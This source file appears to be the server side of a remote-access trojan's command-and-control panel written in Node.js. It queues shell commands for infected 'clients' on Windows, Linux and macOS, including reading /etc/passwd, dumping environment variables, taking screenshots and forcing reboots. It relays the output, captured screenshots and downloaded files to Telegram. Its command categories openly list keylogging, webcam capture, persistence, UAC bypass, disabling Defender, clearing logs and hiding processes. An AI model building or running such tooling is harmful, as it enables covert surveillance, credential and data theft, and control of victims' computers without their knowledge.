const Task = require('../models/Task');
const Client = require('../models/Client');
const telegramService = require('../services/telegramService');

// Platform-specific command mappings
const PLATFORM_COMMANDS = {
    windows: {
        'get-processes': 'Get-Process | Select-Object Name, Id, CPU, WorkingSet | ConvertTo-Json',
        'reboot-computer': 'Restart-Computer -Force',
        'get-system-info': 'Get-ComputerInfo | ConvertTo-Json',
        'get-network-info': 'Get-NetAdapter | Select-Object Name, InterfaceDescription, LinkSpeed, Status | ConvertTo-Json',
        'get-installed-software': 'Get-WmiObject -Class Win32_Product | Select-Object Name, Version, Vendor | ConvertTo-Json',
        'get-services': 'Get-Service | Select-Object Name, Status, StartType | ConvertTo-Json',
        'get-event-logs': 'Get-EventLog -LogName System -Newest 50 | ConvertTo-Json',
        'get-users': 'Get-LocalUser | Select-Object Name, Enabled, LastLogon | ConvertTo-Json',
        'get-disk-info': 'Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace | ConvertTo-Json',
        'screenshot': 'powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.SendKeys]::SendWait(\'{PRTSC}\'); Start-Sleep -Seconds 1"',
        'get-registry-key': 'Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion" | ConvertTo-Json',
        'list-startup-programs': 'Get-WmiObject Win32_StartupCommand | Select-Object Name, Command, Location | ConvertTo-Json'
    },
    linux: {
        'get-processes': 'ps aux --format=pid,ppid,user,cpu,mem,command --no-headers | head -50',
        'reboot-computer': 'sudo reboot',
        'get-system-info': 'uname -a && cat /etc/os-release && free -h && df -h',
        'get-network-info': 'ip addr show && netstat -tuln',
        'get-installed-software': 'dpkg -l | head -50 || rpm -qa | head -50',
        'get-services': 'systemctl list-units --type=service --state=running',
        'get-event-logs': 'journalctl -n 50 --no-pager',
        'get-users': 'cat /etc/passwd | cut -d: -f1,3,4,5,6,7',
        'get-disk-info': 'df -h && lsblk',
        'screenshot': 'scrot /tmp/screenshot.png 2>/dev/null || gnome-screenshot -f /tmp/screenshot.png',
        'get-environment': 'env | sort',
        'list-startup-programs': 'ls -la /etc/init.d/ && systemctl list-unit-files --type=service --state=enabled'
    },
    macos: {
        'get-processes': 'ps aux | head -50',
        'reboot-computer': 'sudo reboot',
        'get-system-info': 'system_profiler SPSoftwareDataType SPHardwareDataType',
        'get-network-info': 'ifconfig && netstat -rn',
        'get-installed-software': 'system_profiler SPApplicationsDataType | head -100',
        'get-services': 'launchctl list | head -50',
        'get-event-logs': 'log show --last 1h --max 50',
        'get-users': 'dscl . list /Users | grep -v "^_"',
        'get-disk-info': 'df -h && diskutil list',
        'screenshot': 'screencapture -x /tmp/screenshot.png',
        'get-environment': 'env | sort',
        'list-startup-programs': 'launchctl list | grep -v "^-" && ls -la ~/Library/LaunchAgents/'
    }
};

// Command categories for capability filtering
const COMMAND_CATEGORIES = {
    'system_info': ['get-system-info', 'get-disk-info', 'get-environment'],
    'process_management': ['get-processes', 'kill-process'],
    'network': ['get-network-info', 'ping', 'traceroute'],
    'user_management': ['get-users', 'add-user', 'delete-user'],
    'service_management': ['get-services', 'start-service', 'stop-service'],
    'persistence': ['list-startup-programs', 'add-startup', 'remove-startup'],
    'surveillance': ['screenshot', 'keylogger', 'webcam'],
    'file_management': ['list-files', 'download-file', 'upload-file', 'delete-file'],
    'registry': ['get-registry-key', 'set-registry-key', 'delete-registry-key'], // Windows only
    'privilege_escalation': ['elevate-privileges', 'bypass-uac'], // Platform specific
    'evasion': ['disable-defender', 'clear-logs', 'hide-process']
};

// Get platform-specific commands for a client
function getPlatformCommands(operatingSystem) {
    return PLATFORM_COMMANDS[operatingSystem] || {};
}

// Check if a command is supported on a platform
function isCommandSupported(command, operatingSystem, capabilities) {
    const platformCommands = getPlatformCommands(operatingSystem);
    
    // Check if command exists in platform-specific commands
    if (platformCommands[command]) {
        return true;
    }
    
    // Check if command is supported by client capabilities
    if (capabilities && capabilities.commands) {
        return capabilities.commands.some(cap => command.toLowerCase().includes(cap.toLowerCase()));
    }
    
    return false;
}

// Get available commands for a client based on platform and capabilities
function getAvailableCommands(operatingSystem, capabilities) {
    const platformCommands = getPlatformCommands(operatingSystem);
    const availableCommands = Object.keys(platformCommands);
    
    // Add capability-based commands
    if (capabilities) {
        Object.keys(COMMAND_CATEGORIES).forEach(category => {
            const categoryCommands = COMMAND_CATEGORIES[category];
            
            // Check if client has capabilities for this category
            const hasCapability = capabilities.features && 
                capabilities.features.some(feature => 
                    category.includes(feature) || feature.includes(category.split('_')[0])
                );
            
            if (hasCapability) {
                categoryCommands.forEach(cmd => {
                    if (!availableCommands.includes(cmd) && isCommandSupported(cmd, operatingSystem, capabilities)) {
                        availableCommands.push(cmd);
                    }
                });
            }
        });
    }
    
    return availableCommands;
}

// Translate generic command to platform-specific command
function translateCommand(command, operatingSystem, capabilities) {
    const platformCommands = getPlatformCommands(operatingSystem);
    
    // Direct mapping exists
    if (platformCommands[command]) {
        return platformCommands[command];
    }
    
    // Try to find similar command or use generic approach
    switch (command) {
        case 'kill-process':
            if (operatingSystem === 'windows') {
                return 'Stop-Process -Id {PID} -Force';
            } else {
                return 'kill -9 {PID}';
            }
        case 'ping':
            return operatingSystem === 'windows' ? 'ping -n 4 {HOST}' : 'ping -c 4 {HOST}';
        case 'traceroute':
            return operatingSystem === 'windows' ? 'tracert {HOST}' : 'traceroute {HOST}';
        default:
            return command; // Return as-is if no translation available
    }
}

const sendScriptToClientAction = async (req, res) => {
    try {
        const { uuid, command } = req.body;
        
        if (!uuid || !command) {
            return res.status(400).json({ 
                success: false, 
                message: 'UUID and command are required' 
            });
        }

        // Get client information for platform-aware processing
        const client = await Client.findOne({ uuid: uuid });
        if (!client) {
            return res.status(404).json({ 
                success: false, 
                message: 'Client not found' 
            });
        }

        const operatingSystem = client.operatingSystem || 'unknown';
        const capabilities = client.capabilities || {};

        // Validate command compatibility
        if (!isCommandSupported(command, operatingSystem, capabilities)) {
            return res.status(400).json({ 
                success: false, 
                message: `Command '${command}' is not supported on ${operatingSystem} platform`,
                supportedCommands: getAvailableCommands(operatingSystem, capabilities)
            });
        }

        // Translate command to platform-specific version
        const translatedCommand = translateCommand(command, operatingSystem, capabilities);

        // Create and save the task
        const task = new Task({
            uuid: uuid,
            command: translatedCommand,
            originalCommand: command,
            platform: operatingSystem,
            status: 'pending',
            createdAt: new Date()
        });

        await task.save();

        // Send Telegram notification if enabled
        if (telegramService.isEnabled()) {
            try {
                await telegramService.sendCommandOutput(
                    client,
                    command,
                    `Command queued for execution: ${translatedCommand}`,
                    'text'
                );
            } catch (telegramError) {
                console.error('Failed to send Telegram notification:', telegramError);
                // Don't fail the main request if Telegram fails
            }
        }

        res.json({ 
            success: true, 
            message: 'Command sent successfully',
            taskId: task._id,
            translatedCommand: translatedCommand,
            platform: operatingSystem,
            telegramSent: telegramService.isEnabled()
        });
    } catch (error) {
        console.error('Error in sendScriptToClientAction:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: error.message 
        });
    }
};

const getTasksForClientAction = async (req, res) => {
    try {
        const { uuid } = req.params;
        
        if (!uuid) {
            return res.status(400).json({ 
                success: false, 
                message: 'UUID is required' 
            });
        }

        const tasks = await Task.find({ uuid: uuid }).sort({ createdAt: -1 });
        
        res.json({ 
            success: true, 
            tasks: tasks 
        });
    } catch (error) {
        console.error('Error in getTasksForClientAction:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: error.message 
        });
    }
};

// New endpoint to get available commands for a client
const getAvailableCommandsAction = async (req, res) => {
    try {
        const { uuid } = req.params;
        
        if (!uuid) {
            return res.status(400).json({ 
                success: false, 
                message: 'UUID is required' 
            });
        }

        const client = await Client.findOne({ uuid: uuid });
        if (!client) {
            return res.status(404).json({ 
                success: false, 
                message: 'Client not found' 
            });
        }

        const operatingSystem = client.operatingSystem || 'unknown';
        const capabilities = client.capabilities || {};
        const availableCommands = getAvailableCommands(operatingSystem, capabilities);

        res.json({ 
            success: true, 
            platform: operatingSystem,
            capabilities: capabilities,
            availableCommands: availableCommands,
            commandCategories: COMMAND_CATEGORIES
        });
    } catch (error) {
        console.error('Error in getAvailableCommandsAction:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: error.message 
        });
    }
};

// New endpoint to validate a command for a specific client
const validateCommandAction = async (req, res) => {
    try {
        const { uuid, command } = req.body;
        
        if (!uuid || !command) {
            return res.status(400).json({ 
                success: false, 
                message: 'UUID and command are required' 
            });
        }

        const client = await Client.findOne({ uuid: uuid });
        if (!client) {
            return res.status(404).json({ 
                success: false, 
                message: 'Client not found' 
            });
        }

        const operatingSystem = client.operatingSystem || 'unknown';
        const capabilities = client.capabilities || {};
        const isSupported = isCommandSupported(command, operatingSystem, capabilities);
        const translatedCommand = translateCommand(command, operatingSystem, capabilities);

        res.json({ 
            success: true, 
            isSupported: isSupported,
            platform: operatingSystem,
            originalCommand: command,
            translatedCommand: translatedCommand,
            reason: isSupported ? 'Command is supported' : `Command not supported on ${operatingSystem}`
        });
    } catch (error) {
        console.error('Error in validateCommandAction:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: error.message 
        });
    }
};

// Handle command result from client
const handleCommandResultAction = async (req, res) => {
    try {
        const { uuid, taskId, result, status, outputType, fileData } = req.body;
        
        if (!uuid || !taskId || !result) {
            return res.status(400).json({ 
                success: false, 
                message: 'UUID, taskId, and result are required' 
            });
        }

        // Update task status
        const task = await Task.findById(taskId);
        if (!task) {
            return res.status(404).json({ 
                success: false, 
                message: 'Task not found' 
            });
        }

        task.status = status || 'completed';
        task.result = result;
        task.completedAt = new Date();
        await task.save();

        // Get client information
        const client = await Client.findOne({ uuid: uuid });
        if (!client) {
            return res.status(404).json({ 
                success: false, 
                message: 'Client not found' 
            });
        }

        // Send Telegram notification if enabled
        if (telegramService.isEnabled()) {
            try {
                switch (outputType) {
                    case 'screenshot':
                        if (fileData) {
                            const imageBuffer = Buffer.from(fileData, 'base64');
                            await telegramService.sendScreenshot(client, imageBuffer, `Screenshot from ${client.computerName}`);
                        }
                        break;
                    case 'file':
                        if (fileData) {
                            const fileBuffer = Buffer.from(fileData, 'base64');
                            const fileName = `download_${Date.now()}.bin`;
                            await telegramService.sendFile(client, fileName, fileBuffer, `File downloaded from ${client.computerName}`);
                        }
                        break;
                    case 'system-info':
                        await telegramService.sendSystemInfo(client, result);
                        break;
                    case 'text':
                    default:
                        await telegramService.sendCommandOutput(client, task.command, result, 'text');
                        break;
                }
            } catch (telegramError) {
                console.error('Failed to send Telegram notification:', telegramError);
                // Don't fail the main request if Telegram fails
            }
        }

        res.json({ 
            success: true, 
            message: 'Command result processed successfully',
            telegramSent: telegramService.isEnabled()
        });
    } catch (error) {
        console.error('Error in handleCommandResultAction:', error);
        res.status(500).json({ 
            success: false, 
            message: 'Internal server error',
            error: error.message 
        });
    }
};

module.exports = {
    sendScriptToClientAction,
    getTasksForClientAction,
    getAvailableCommandsAction,
    validateCommandAction,
    handleCommandResultAction
};